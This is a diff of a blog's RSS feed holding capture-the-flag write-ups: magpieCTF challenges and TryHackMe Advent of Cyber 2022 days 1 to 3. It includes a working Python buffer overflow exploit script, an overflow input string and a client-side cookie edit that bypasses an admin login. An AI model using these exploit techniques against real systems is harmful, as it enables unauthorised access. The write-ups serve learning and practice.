-        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">69</span>,
-        ip
-    ]
-)
-<span style="color:#75715e"># Add the bytes for a newline to mimick pressing the &#34;Enter&#34; key</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
-
-<span style="color:#75715e"># Takes care of closing the socket</span>
-<span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket() <span style="color:#66d9ef">as</span> conn:
-    conn<span style="color:#f92672">.</span>connect((args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port))
-    <span style="color:#75715e"># print(conn.recv(4096).decode(&#34;utf-8&#34;))</span>
-    conn<span style="color:#f92672">.</span>send(payload)
-    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</code></pre></div><p>Running the script, we get the following response from the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket <span style="color:#75715e"># dealing with internet connections</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse <span style="color:#75715e"># pass arguments when calling the script so we can use it for any other CTF challenges</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct <span style="color:#75715e"># for changing the memory address into Little Endian.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build out the arg parser and args to take in</span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;host&#34;</span>,
+</span></span><span style="display:flex;"><span>    type<span style="color:#f92672">=</span>str,
+</span></span><span style="display:flex;"><span>    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The hostname or IP address to connect to&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;port&#34;</span>,
+</span></span><span style="display:flex;"><span>    type<span style="color:#f92672">=</span>int,
+</span></span><span style="display:flex;"><span>    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port for the service to connect to&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for testing</span>
+</span></span><span style="display:flex;"><span>print(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Swaps the memory address to Little Endian for us</span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x08048486</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 69 here represents the offset + 1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span>    [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">69</span>,
+</span></span><span style="display:flex;"><span>        ip
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add the bytes for a newline to mimick pressing the &#34;Enter&#34; key</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Takes care of closing the socket</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket() <span style="color:#66d9ef">as</span> conn:
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect((args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(conn.recv(4096).decode(&#34;utf-8&#34;))</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>Running the script, we get the following response from the server:</p>
 <pre tabindex="0"><code>magpie{0mn1_fl4g_3v3rywh3r3}
 </code></pre>]]></content>
         </item>
@@ -185,8 +321,8 @@ Solution Opening the C file, we see that the file does not have the typical gets
 <h2 id="solution">Solution</h2>
 <p>Opening the C file, we see that the file does not have the typical <code>gets</code> function that is well known for its vulnerabilities. Instead the function we have to focus on it scanf. If you aren’t aware, <code>scanf</code> does not have bound checking capability so if the input string is longer than the buffer size, then it will overflow.</p>
 <p>Let’s test that out by making a quick test <code>flag.txt</code> in the same directory as the Code executable. Now we will pass some arbirtuary input like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-</code></pre></div><p>We see the output below:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></code></pre></div><p>We see the output below:
 <img src="../imgs/overflow.png" alt="overflow"></p>
 <p>The flag is:</p>
 <pre tabindex="0"><code>magpie{5c4nf_n07_54f3}
@@ -228,27 +364,27 @@ Note, you could have alternatively seen within the robots.txt that it disallows 
 <p>Note, you could have alternatively seen within the <code>robots.txt</code> that it disallows the traversal/crawling of <code>/admin.html</code> or you could have seen the invisible link within the nav bar.</p>
 <p>We navigate to the portal and try admin:admin for the credentials to see if the most basic username and password was set. Alas we have to dig deeper. Going into the browser dev tools we see that a <code>script.js</code> is run to check on the login POST form. Luckily, double clicking the script allows us to see the Javascript file so we can see how the login is validated.</p>
 <p>Notice how the only parameter tha matters is the following:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
-    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
-    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;username&#39;</span>).<span style="color:#a6e22e">value</span>;
-    <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span>) {
-        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin=false&#34;</span>;
-        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`user=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
-        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
-</span><span style="color:#75715e"></span>    }
-    <span style="color:#66d9ef">else</span> {
-        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">admin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getCookie</span>(<span style="color:#e6db74">&#34;admin&#34;</span>);
-        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">admin</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;true&#34;</span>) {
-            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;panel.html&#34;</span>; <span style="color:#75715e">// Redirect
-</span><span style="color:#75715e"></span>        }
-        <span style="color:#66d9ef">else</span> {
-            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
-</span><span style="color:#75715e"></span>        }
-    }
-});
-</code></pre></div><p>We can see that if we are able to modify the cookie key value pair of <code>admin=false</code> to <code>admin=true</code> then we can submit anything within the form and allowed to login. Going to the console and typing:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin=true&#34;</span>
-</code></pre></div><p>Refresh the page, and pass in random credentials and we are in!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;username&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin=false&#34;</span>;
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`user=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">admin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getCookie</span>(<span style="color:#e6db74">&#34;admin&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">admin</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;true&#34;</span>) {
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;panel.html&#34;</span>; <span style="color:#75715e">// Redirect
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>We can see that if we are able to modify the cookie key value pair of <code>admin=false</code> to <code>admin=true</code> then we can submit anything within the form and allowed to login. Going to the console and typing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin=true&#34;</span>
+</span></span></code></pre></div><p>Refresh the page, and pass in random credentials and we are in!</p>
 <pre tabindex="0"><code>magpie{bu7-7h3-m1Lk-ju57-fl04T5-4W4y!}
 </code></pre>]]></content>
         </item>
@@ -269,12 +405,12 @@ We install the stegsolver tool on my virtual machine and ran the imagine combine
 <img src="../imgs/combine.png" alt="combine"></p>
 <h2 id="solution">Solution</h2>
 <p>In our terminal of choice, using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings challenge.png
-</code></pre></div><p>We can see in the output that the challengers offered a hint: <code>Have you heard of stegsolve?</code> My answer: nope.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings challenge.png
+</span></span></code></pre></div><p>We can see in the output that the challengers offered a hint: <code>Have you heard of stegsolve?</code> My answer: nope.</p>
 <p>A quick search for <code>stegsolve</code> leads me to this <a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install">GitHub repo containing a stegsolve tool</a>.</p>
 <p>We install the stegsolver tool on my virtual machine and ran the imagine combiner tool under the analyse tab to retrieve the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">magpieCTF<span style="color:#f92672">{</span>H0p3fully_U_D1dnt_Brut3_f0rc3_1t<span style="color:#f92672">}</span>
-</code></pre></div>]]></content>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>magpieCTF<span style="color:#f92672">{</span>H0p3fully_U_D1dnt_Brut3_f0rc3_1t<span style="color:#f92672">}</span>
+</span></span></code></pre></div>]]></content>
         </item>
         
         <item>
@@ -373,7 +509,7 @@ As the rules prohibited players from asking third parties for solutions or metho
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-01/readme/</guid>
             <description>Day 1 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves solving 3 puzzles that provide general outlines for various security frameworks. Each puzzle comes with a set of clues that will guide you to place the puzzle pieces in the correct order.
 Puzzle #1 Clues:
- Research is part of my ask, finding clues in public sources. Simple documents I turn into malware. A pizza, parcel or payload all have me as an action in common.</description>
+Research is part of my ask, finding clues in public sources. Simple documents I turn into malware. A pizza, parcel or payload all have me as an action in common.</description>
             <content type="html"><![CDATA[<p>Day 1 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves solving 3 puzzles that provide general outlines for various security frameworks. Each puzzle comes with a set of <code>clues</code> that will guide you to place the puzzle pieces in the correct order.</p>
 <h2 id="puzzle-1">Puzzle #1</h2>
 <p><img src="../imgs/puzzle-1.png" alt="Puzzle 1"></p>
@@ -420,7 +556,7 @@ Puzzle #1 Clues:
 <pre tabindex="0"><code>The Bandit Yeti!
 </code></pre><h4 id="whats-the-flag-that-they-left-behind">What&rsquo;s the flag that they left behind?</h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>THM{IT'S A Y3T1 CHR1$TMA$}
+<pre tabindex="0"><code>THM{IT&#39;S A Y3T1 CHR1$TMA$}
 </code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
@@ -436,7 +572,7 @@ Puzzle #1 Clues:
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-02/readme/</guid>
             <description>Day 2 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about grep and its basic capabilities. This task requires you to use grep in order to efficiently answer the questions.
 Learning Objectives In today’s task, you will:
- Learn what log files are and why they’re useful Understand what valuable information log files can contain Understand some common locations these logs file can be found Use some basic Linux commands to start analysing log files for valuable information Help Elf McBlue track down the Bandit Yeti APT!</description>
+Learn what log files are and why they’re useful Understand what valuable information log files can contain Understand some common locations these logs file can be found Use some basic Linux commands to start analysing log files for valuable information Help Elf McBlue track down the Bandit Yeti APT!</description>
             <content type="html"><![CDATA[<p>Day 2 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about grep and its basic capabilities. This task requires you to use grep in order to efficiently answer the questions.</p>
 <h3 id="learning-objectives">Learning Objectives</h3>
 <p>In today’s task, you will:</p>
@@ -450,25 +586,25 @@ Learning Objectives In today’s task, you will:
 <h4 id="use-the-ls-command-to-list-the-files-present-in-the-current-directory-how-many-log-files-are-present">Use the <code>ls</code> command to list the files present in the current directory. How many log files are present?</h4>
 <p>Make sure your current working directory is <code>/home/elfmcblue</code>. If you do not know, run this command: <code>pwd</code></p>
 <p>Count the number of files that are output to the terminal.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls
-SSHD.log webserver.log
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>SSHD.log webserver.log
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>2
 </code></pre><h4 id="elf-mcskidy-managed-to-capture-the-logs-generated-by-the-web-server-what-is-the-name-of-this-log-file">Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file?</h4>
 <p>Make sure your current working directory is <code>/home/elfmcblue</code>. If you do not know, run this command: <code>pwd</code></p>
 <p>We are looking for a webserver log file, conveniently, we notice <code>webserver.log</code> exists within the <code>/home/elfmcblue</code> directory.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls
-SSHD.log webserver.log
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>SSHD.log webserver.log
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>webserrver.log
 </code></pre><h4 id="on-what-day-was-santas-naughty-and-nice-list-stolen">On what day was Santa&rsquo;s naughty and nice list stolen?</h4>
 <p>Our first attempt with <code>grep</code>. We chose the <code>-i</code> option because we aren&rsquo;t sure how the word <code>stolen</code> will be written in the log files. Furthermore since we are interested in the webserver logs, we will grep through that file. We notice that the date is November 18th. Checking our calendar, that leads us to the answer. Another possible way to arrive to this conclusion is</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -i <span style="color:#e6db74">&#34;stolen&#34;</span> webserver.log
-10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:23 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /ReceivingStolenGoodsOnline HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
-10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:24 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /011003-new_uk_database_mkes_stolen_pho HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
-10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:27 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /alone_on_preikestoten HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
-10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:27 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /stolen_pc_holds_1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -i <span style="color:#e6db74">&#34;stolen&#34;</span> webserver.log
+</span></span><span style="display:flex;"><span>10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:23 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /ReceivingStolenGoodsOnline HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:24 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /011003-new_uk_database_mkes_stolen_pho HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:27 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /alone_on_preikestoten HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:35:27 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /stolen_pc_holds_1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">437</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;gobuster/3.O.1&#34;</span>
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>Friday
 </code></pre><h4 id="what-is-the-ip-address-of-the-attacker">What is the IP address of the attacker?</h4>
 <p>In the output of the above grep command, we notice that the IP address is shown in the logs. This IP address is particularly persistent in its requests to the webserver. Therefore we can infer that the IP address making these requests is from the attacker.</p>
@@ -476,15 +612,15 @@ SSHD.log webserver.log
 <pre tabindex="0"><code>10.10.249.191
 </code></pre><h4 id="what-is-the-name-of-the-important-list-that-the-attacker-stole-from-santa">What is the name of the important list that the attacker stole from Santa?</h4>
 <p>Knowing that the file we are looking for is a <code>list</code>, we can infer that the most likely name format of this list would be <code>something_list.txt</code> or <code>someList.txt</code>. It is common practice to use a easily readable file format like <code>.txt</code> extension. Therefore we use <code>-i</code> to ignore the case in the event that the list is written in <a href="https://en.wikipedia.org/wiki/Snake_case">snake case</a> or <a href="https://en.wikipedia.org/wiki/Camel_case">camel case</a>. We could have used the <code>-r</code> option instead of specifying the <code>webserver.log</code> file in case there were more than 2 files in the current working directory. However, it was most likely going to be logged within the <code>webserver.log</code> file so we chose that option instead.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -i <span style="color:#e6db74">&#34;list.txt&#34;</span> webserver.log
-10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:34:39 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /santaslist.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">133872</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.19.4 (linux-gnu)&#34;</span>
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -i <span style="color:#e6db74">&#34;list.txt&#34;</span> webserver.log
+</span></span><span style="display:flex;"><span>10.10.249.191 - - <span style="color:#f92672">[</span>18/Nov/2022:12:34:39 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /santaslist.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">133872</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.19.4 (linux-gnu)&#34;</span>
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>santaslist.txt
 </code></pre><h4 id="look-through-the-log-files-for-the-flag-the-format-of-the-flag-is-thm">Look through the log files for the flag. The format of the flag is: THM</h4>
 <p>Using the <code>-r</code> option, we recursively iterate through all of the files within the current working directory (<code>pwd</code>) and search for the beginning portion of the flag format that consistantly remains the same: <code>&quot;THM{&quot;</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -r <span style="color:#e6db74">&#34;THM{&#34;</span>
-SSHD.log:THM<span style="color:#f92672">{</span>STOLENSANTASLIST<span style="color:#f92672">}</span>
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -r <span style="color:#e6db74">&#34;THM{&#34;</span>
+</span></span><span style="display:flex;"><span>SSHD.log:THM<span style="color:#f92672">{</span>STOLENSANTASLIST<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>THM{STOLENSANTASLIST}
 </code></pre><h2 id="authors">Authors</h2>
 <ul>
@@ -500,7 +636,7 @@ SSHD.log:THM<span style="color:#f92672">{</span>STOLENSANTASLIST<span style="col
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-03/readme/</guid>
             <description>Day 3 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about OSINT techniques.
-Learning Objectives  What is OSINT, and what techniques can extract useful information against a website or target? Using dorks to find specific information on the Google search engine Extracting hidden directories through the Robots.txt file Domain owner information through WHOIS lookup Searching data from hacked databases Acquiring sensitive information from publicly available GitHub repositories  What is the name of the Registrar for the domain santagift.</description>
+Learning Objectives What is OSINT, and what techniques can extract useful information against a website or target? Using dorks to find specific information on the Google search engine Extracting hidden directories through the Robots.txt file Domain owner information through WHOIS lookup Searching data from hacked databases Acquiring sensitive information from publicly available GitHub repositories What is the name of the Registrar for the domain santagift.</description>
             <content type="html"><![CDATA[<p>Day 3 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about OSINT techniques.</p>
 <h3 id="learning-objectives">Learning Objectives</h3>
 <ul>
@@ -549,7 +685,7 @@ Learning Objectives  What is OSINT, and what techniques can extract useful infor
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-04/readme/</guid>
